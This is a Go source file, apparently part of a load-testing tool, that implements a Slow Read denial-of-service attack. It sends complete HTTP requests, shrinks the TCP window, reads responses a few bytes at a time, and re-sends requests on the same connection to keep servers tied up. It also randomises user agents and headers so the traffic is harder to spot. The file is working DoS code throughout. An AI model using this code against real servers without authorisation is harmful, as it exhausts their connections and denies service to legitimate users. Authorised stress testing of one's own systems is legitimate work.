package strategy

import (
	"context"
	"io"
	"sync/atomic"
	"time"

	"github.com/jdw/loadtestforge/internal/config"
	"github.com/jdw/loadtestforge/internal/httpdata"
	"github.com/jdw/loadtestforge/internal/netutil"
)

// SlowRead implements the Slow Read attack.
// It sends a complete HTTP request but reads the response very slowly,
// forcing the server to keep the connection open and buffer the response.
type SlowRead struct {
	readInterval      time.Duration
	readSize          int
	connConfig        netutil.ConnConfig
	headerRandomizer  *httpdata.HeaderRandomizer
	activeConnections int64
	metricsCallback   MetricsCallback
}

func NewSlowRead(readInterval time.Duration, readSize int, windowSize int, bindIP string) *SlowRead {
	cfg := netutil.DefaultConnConfig(bindIP)
	cfg.WindowSize = windowSize

	return &SlowRead{
		readInterval:     readInterval,
		readSize:         readSize,
		connConfig:       cfg,
		headerRandomizer: httpdata.DefaultHeaderRandomizer(),
	}
}

// SetMetricsCallback sets the metrics callback for telemetry.
func (s *SlowRead) SetMetricsCallback(callback MetricsCallback) {
	s.metricsCallback = callback
}

func (s *SlowRead) Execute(ctx context.Context, target Target) error {
	connID := generateConnID()
	startTime := time.Now()

	mc, parsedURL, err := netutil.DialManaged(ctx, target.URL, s.connConfig, &s.activeConnections)
	if err != nil {
		return err
	}
	defer mc.Close()

	// Record connection start
	if s.metricsCallback != nil {
		s.metricsCallback.RecordConnectionStart(connID, mc.RemoteAddr().String())
	}

	userAgent := httpdata.RandomUserAgent()

	// Build GET request (Accept-Encoding: identity to prevent compression)
	request := s.headerRandomizer.BuildGETRequest(parsedURL, userAgent)

	if _, err := mc.WriteWithTimeout([]byte(request), config.DefaultWriteTimeout); err != nil {
		if s.metricsCallback != nil {
			s.metricsCallback.RecordSocketTimeout()
		}
		return err
	}

	// Record initial success
	if s.metricsCallback != nil {
		s.metricsCallback.RecordSuccessWithLatency(time.Since(startTime))
	}

	ticker := time.NewTicker(s.readInterval)
	defer ticker.Stop()

	readBuffer := make([]byte, s.readSize)
	readCount := 0

	for {
		select {
		case <-mc.Context().Done():
			if s.metricsCallback != nil {
				s.metricsCallback.RecordConnectionEnd(connID)
			}
			return nil
		case <-ticker.C:
			// Read very small amount of data very slowly
			n, err := mc.ReadWithTimeout(readBuffer, config.DefaultReadTimeout)

			// EOF or connection closed - send new request
			if err == io.EOF || (err == nil && n == 0) {
				// Server finished sending, send new request on the same connection
				if _, err := mc.WriteWithTimeout([]byte(request), config.DefaultWriteTimeout); err != nil {
					if s.metricsCallback != nil {
						s.metricsCallback.RecordSocketTimeout()
						s.metricsCallback.RecordConnectionEnd(connID)
					}
					return err
				}
				// Record reconnect
				if s.metricsCallback != nil {
					s.metricsCallback.RecordSocketReconnect()
				}
				continue
			}

			if err != nil {
				if s.metricsCallback != nil {
					s.metricsCallback.RecordSocketTimeout()
					s.metricsCallback.RecordConnectionEnd(connID)
				}
				return err
			}

			readCount++
			// Record activity periodically (every 10 reads)
			if s.metricsCallback != nil && readCount%10 == 0 {
				s.metricsCallback.RecordConnectionActivity(connID)
			}
		}
	}
}

func (s *SlowRead) Name() string {
	return "slow-read"
}

func (s *SlowRead) ActiveConnections() int64 {
	return atomic.LoadInt64(&s.activeConnections)
}
